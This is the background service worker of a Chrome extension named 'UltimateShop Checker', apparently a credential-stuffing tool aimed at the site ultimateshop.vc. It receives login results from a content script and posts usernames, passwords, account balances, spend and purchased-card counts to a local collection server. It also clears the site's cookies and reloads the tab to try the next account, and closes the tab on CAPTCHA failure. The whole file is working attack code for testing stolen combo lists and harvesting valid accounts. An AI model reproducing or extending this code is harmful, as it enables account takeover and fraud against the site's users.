// UltimateShop Checker - Background Service Worker
console.log('UltimateShop Background: Service worker starting...');

// Service worker installation
self.addEventListener('install', (event) => {
    console.log('UltimateShop Background: Service worker installed');
    self.skipWaiting();
});

// Service worker activation
self.addEventListener('activate', (event) => {
    console.log('UltimateShop Background: Service worker activated');
    event.waitUntil(self.clients.claim());
});

// Listen for messages from content script
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    console.log('UltimateShop Background: Received message:', message.type);
    
    try {
        if (message.type === 'hit_detected') {
            // Report successful login to server
            fetch('http://localhost:5050/report-hit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: message.username,
                    password: message.password,
                    balance: message.balance,
                    totalSpent: message.totalSpent,
                    cardsPurchased: message.cardsPurchased,
                    comboCheck: message.comboCheck,
                    totalCaptures: message.totalCaptures
                })
            }).then(response => {
                if (response.ok) {
                    console.log('UltimateShop Background: Hit reported successfully');
                } else {
                    console.error('UltimateShop Background: Failed to report hit');
                }
            }).catch(error => {
                console.error('UltimateShop Background: Error reporting hit:', error);
            });
            
            // Clear cookies for ultimateshop.vc
            chrome.cookies.getAll({ domain: 'ultimateshop.vc' }, (cookies) => {
                cookies.forEach(cookie => {
                    const url = `https://${cookie.domain}${cookie.path}`;
                    chrome.cookies.remove({ url, name: cookie.name });
                });
                console.log('Cleared cookies for ultimateshop.vc');
                
                // Auto-refresh current tab for new account
                setTimeout(() => {
                    chrome.tabs.reload(sender.tab.id, () => {
                        console.log('Tab refreshed for new account:', sender.tab.id);
                    });
                }, 2000); // Wait 2 seconds before refresh
            });
            
        } else if (message.type === 'fail_detected') {
            // Report failed login to server
            fetch('http://localhost:5050/report-fail', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: message.username,
                    password: message.password
                })
            }).then(response => {
                if (response.ok) {
                    console.log('UltimateShop Background: Fail reported successfully');
                } else {
                    console.error('UltimateShop Background: Failed to report fail');
                }
            }).catch(error => {
                console.error('UltimateShop Background: Error reporting fail:', error);
            });
            
            // Clear cookies for ultimateshop.vc
            chrome.cookies.getAll({ domain: 'ultimateshop.vc' }, (cookies) => {
                cookies.forEach(cookie => {
                    const url = `https://${cookie.domain}${cookie.path}`;
                    chrome.cookies.remove({ url, name: cookie.name });
                });
                console.log('Cleared cookies for ultimateshop.vc');
                
                // Auto-refresh current tab for new account
                setTimeout(() => {
                    chrome.tabs.reload(sender.tab.id, () => {
                        console.log('Tab refreshed for new account:', sender.tab.id);
                    });
                }, 2000); // Wait 2 seconds before refresh
            });
        } else if (message.type === 'clear_cookies_and_close') {
            console.log('UltimateShop Background: Clearing cookies and closing tab due to CAPTCHA failure...');
            
            // Clear all cookies for ultimateshop.vc
            chrome.cookies.getAll({ domain: 'ultimateshop.vc' }, (cookies) => {
                cookies.forEach(cookie => {
                    const url = `https://${cookie.domain}${cookie.path}`;
                    chrome.cookies.remove({ url, name: cookie.name });
                });
                console.log('Cleared all cookies for ultimateshop.vc');
                
                // Close the current tab after clearing cookies
                setTimeout(() => {
                    chrome.tabs.remove(sender.tab.id, () => {
                        console.log('Tab closed due to CAPTCHA failure:', sender.tab.id);
                    });
                }, 1000);
            });
        }
    } catch (error) {
        console.error('UltimateShop Background: Error processing message:', error);
    }
});

// Service worker error handling
self.addEventListener('error', (event) => {
    console.error('UltimateShop Background: Service worker error:', event.error);
});

self.addEventListener('unhandledrejection', (event) => {
    console.error('UltimateShop Background: Unhandled promise rejection:', event.reason);
});